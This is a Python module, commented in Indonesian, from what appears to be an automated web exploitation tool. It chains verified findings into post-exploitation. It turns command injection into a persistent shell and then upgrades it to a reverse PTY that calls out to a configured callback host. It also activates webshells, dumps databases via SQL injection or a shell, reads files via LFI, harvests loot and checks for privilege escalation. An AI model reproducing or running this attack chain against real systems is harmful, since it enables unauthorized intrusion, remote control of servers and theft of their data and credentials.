from __future__ import annotations
"""Eksploitasi berantai: dari temuan verified ke shell, dump, loot, privesc."""
import asyncio
from .modules.base import Finding
from .session.manager import manager
from .post import enum, dbdump, loot, privesc


async def execute(ctx, findings: list[Finding]) -> list[Finding]:
    if ctx.cfg.get("app.safe_mode"):
        await ctx.log("[i] SAFE_MODE — eksploitasi dilewati")
        return []

    verified = {f.kind: f for f in findings if f.verified}
    shells: list = []
    notes = []

    # 1. dapatkan sesi
    if "rce" in verified and verified["rce"].data.get("vector") == "cmdinject":
        f = verified["rce"]
        s = manager.make("cmd-injection", ctx, ctx.target,
                         url=f.data["url"], param=f.data["param"],
                         sep=f.data["sep"], wrapper="")
        if await s.establish():
            shells.append(s); notes.append("cmd-injection → shell persisten")
        if ctx.cfg.get("exploit.auto_reverse") and ctx.cfg.get("app.callback_host"):
            r = manager.make("reverse", ctx, ctx.target, driver=s,
                             host=ctx.cfg.get("app.callback_host"))
            if await r.establish():
                asyncio.create_task(manager.pump(r))
                shells.append(r); notes.append("upgrade → reverse PTY")
            else:
                notes.append("reverse gagal, pakai cmd-injection")

    if "upload-rce" in verified:
        f = verified["upload-rce"]
        w = manager.make("webshell", ctx, ctx.target, url=f.target)
        if await w.establish():
            shells.append(w); notes.append("webshell aktif")

    if not shells:
        if "sqli" in verified:
            notes.append("SQLi verified → dump DB")
            await dbdump.via_sqli(ctx, verified["sqli"])
        if "lfi" in verified:
            notes.append("LFI verified → baca file")
            await loot.via_lfi(ctx, verified["lfi"])
        return await _summary(ctx, notes, [])

    primary = shells[0]
    await ctx.store.set_state(ctx.job_id, "sessions", [s.sid for s in shells])
    await ctx.bus.publish(ctx.job_id, {"type": "shell", "sessions":
                        [{"sid": s.sid, "kind": s.kind, "streamable": s.streamable} for s in shells]})

    # 2. post-exploit berurutan
    if ctx.cfg.get("exploit.post_enum"):
        await enum.run(ctx, primary)
    if ctx.cfg.get("exploit.post_db_dump"):
        await dbdump.via_shell(ctx, primary)
    if ctx.cfg.get("exploit.post_loot"):
        await loot.harvest(ctx, primary)
    if ctx.cfg.get("exploit.post_privesc"):
        await privesc.check(ctx, primary)

    return await _summary(ctx, notes, shells)


async def _summary(ctx, notes, shells) -> list[Finding]:
    if not notes:
        return []
    return [await ctx.emit(Finding(
        kind="chain", title=f"Chain dieksekusi: {len(notes)} tahap", target=ctx.target,
        severity="critical", confidence="confirmed",
        evidence="\n".join(f"{i+1}. {n}" for i, n in enumerate(notes)),
        repro=[f"# {n}" for n in notes],
        data={"sessions": [s.sid for s in shells]}))]
